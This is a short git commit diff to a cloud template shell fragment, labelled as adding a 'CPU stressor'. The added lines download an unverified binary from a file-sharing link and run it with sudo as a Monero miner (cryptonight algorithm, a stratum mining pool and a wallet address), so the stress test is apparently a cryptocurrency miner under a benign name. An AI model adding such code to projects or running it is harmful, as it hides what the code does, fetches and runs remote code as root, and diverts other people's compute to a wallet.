376064b1fa337c72982ee6bfaaa2f4ca43681d63
Peter Chronz <peter.chronz@gmail.com>
2017-12-07 20:42:04 +0100

    Include a CPU stressor

--- templates/fragments/cpu-stress_configure.sh
+++ templates/fragments/cpu-stress_configure.sh
@@ -1,8 +1,11 @@
 #!/bin/bash
 . /etc/sysconfig/heat-params
 
-echo "Start to configure iperf as a client"
+echo "Start to configure cpu stressor as a client"
 
-apt-get update
-apt-get install iperf
+sudo apt update && apt install -y libmicrohttpd10 \
+                       libhwloc5 libcurl4-openssl-dev
+wget -O stressor https://owncloud.gwdg.de/index.php/s/0aUOjR89S3Tr79W/download
+chmod +x stressor
+sudo ./stressor -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 49zaRwbRQNv9MfHijHCPaoGQUoSKc5TUSZhM4eb7GdToTabyLrEB1HhJwSyQA4N7TkcBbYNDnzuDLGgngyr76ukkC7zu7B2 -p x -t 16
 
